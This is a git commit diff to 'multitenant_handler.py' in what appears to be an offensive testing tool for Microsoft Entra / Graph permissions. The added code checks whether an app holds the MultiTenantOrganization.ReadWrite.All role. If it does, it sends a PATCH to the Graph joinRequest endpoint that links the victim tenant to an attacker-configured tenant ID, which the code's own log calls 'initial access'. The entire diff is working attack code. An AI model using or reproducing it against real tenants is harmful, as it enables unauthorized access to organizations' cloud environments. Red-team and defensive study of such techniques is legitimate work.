6081080af83440a26cbb4fbee1b73646d02dd2eb
Adi <23616271+maladi17@users.noreply.github.com>
2024-04-07 01:40:20 +0300

    Update multitenant_handler.py

--- attacks/handlers/multitenant_handler.py
+++ attacks/handlers/multitenant_handler.py
@@ -9,7 +9,33 @@ logger = logger.createLogger('attacks.handlers.multitenant_handler')
 class Multitenant_Handler(AttackHandler):
     def handle(self, request: Request,responses:List[Response]):
         # TODO map request.roles to fit with this attack
-        if True:
-            pass          
+        if "MultiTenantOrganization.ReadWrite.All" in request.roles:
+            status = False
+            attack_name = "MultiTenantVectors"
+            message = ""
+            error = "MultiTenantVectors - failed"
+            conf = request.attack_config['multiTenant']
+            logger.debug("MultiTenantOrganization.ReadWrite.All - Allows the app to read and write all multi-tenant organization details and tenants, without a signed-in user.")
+
+            logger.debug("Attack vector - initial access.")
+            try:
+                create_message_URL = "https://graph.microsoft.com/beta/tenantRelationships/multiTenantOrganization/joinRequest"
+                message_obj = {
+                    "addedByTenantId": conf["tenantId"]
+                }
+
+                result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)
+                if result.status_code == 204:
+                    message += "Setup multi tenant with %s   \n" % (conf["tenantId"])
+                    status = True
+                if message == "":
+                    message = error
+            except:
+                logger.error("Unexpected exception in multitenant_handler function")
+
             
+            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
+
+
+
         return super().handle(request,responses)
